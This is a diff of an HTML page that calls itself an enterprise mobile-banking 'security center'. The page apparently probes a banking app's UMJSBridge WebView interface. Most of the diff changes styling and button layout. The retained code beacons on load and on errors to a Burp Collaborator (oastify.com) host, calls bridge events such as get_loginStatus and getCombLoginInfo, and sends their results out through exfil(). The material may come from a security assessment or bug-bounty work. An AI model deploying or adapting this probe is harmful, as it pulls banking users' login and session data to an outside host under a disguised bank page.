@@ -3,15 +3,13 @@
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>企业掌银安全中心</title>
 <style>
- body{font-family:monospace;font-size:12px;background:#fff;margin:8px}
- #log{white-space:pre-wrap;word-break:break-all;border:1px solid #ccc;padding:6px;min-height:180px;margin-bottom:10px}
- .grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
- button{padding:10px 4px;font-size:12px;background:#3aa77a;color:#fff;border:0;border-radius:6px}
- button:active{background:#267a56}
- .warn{background:#c07830}
+ body{font-family:monospace;font-size:13px;background:#fff;margin:8px}
+ #log{white-space:pre-wrap;word-break:break-all;border:1px solid #ccc;padding:6px;min-height:160px;margin-bottom:10px}
+ button{display:inline-block;width:48%;margin:1%;padding:14px 0;font-size:13px;background:#3aa77a;color:#fff;border:0;border-radius:6px}
+ button.warn{background:#c07830}
 </style></head><body>
-<div id="log">[boot] typeof UMJSBridge 检测中…</div>
-<div class="grid" id="grid"></div>
+<div id="log">[boot]</div>
+<div id="btns"></div>
 <script>
 var L = document.getElementById('log');
 var OAST = "https://fsbm03ajeb3d1cvmsxsopyv54wanyem3.oastify.com/";
@@ -24,7 +22,6 @@ window.onerror = function(m,s,l){ v('ONERROR: '+m+' @'+l); beacon(OAST+'?evt=jse
 v('typeof UMJSBridge = '+typeof window.UMJSBridge);
 beacon(OAST+'?evt=loaded&bridge='+(typeof window.UMJSBridge));
 
-// [事件名, 参数JSON, 是否警示色]
 var EVTS = [
  ["get_loginStatus", {}, 0],
  ["getCombLoginInfo", {}, 0],
@@ -66,13 +63,16 @@ function run(h, params){
     });
   }catch(e){ v('!! '+h+' THROW: '+e.message); exfil(h, 'THROW:'+e.message); }
 }
-var g = document.getElementById('grid');
-EVTS.forEach(function(e){
-  var b = document.createElement('button');
-  b.textContent = e[0];
-  if (e[2]) b.className = 'warn';
-  b.onclick = function(){ run(e[0].split(' ')[0], e[1]); };
-  g.appendChild(b);
-});
+var G = document.getElementById('btns');
+for (var i=0;i<EVTS.length;i++){
+  (function(e){
+    var b = document.createElement('button');
+    b.textContent = e[0];
+    if (e[2]) b.className = 'warn';
+    b.onclick = function(){ run(e[0].split(' ')[0], e[1]); };
+    G.appendChild(b);
+  })(EVTS[i]);
+}
+v('buttons rendered: '+EVTS.length);
 </script>
 </body></html>
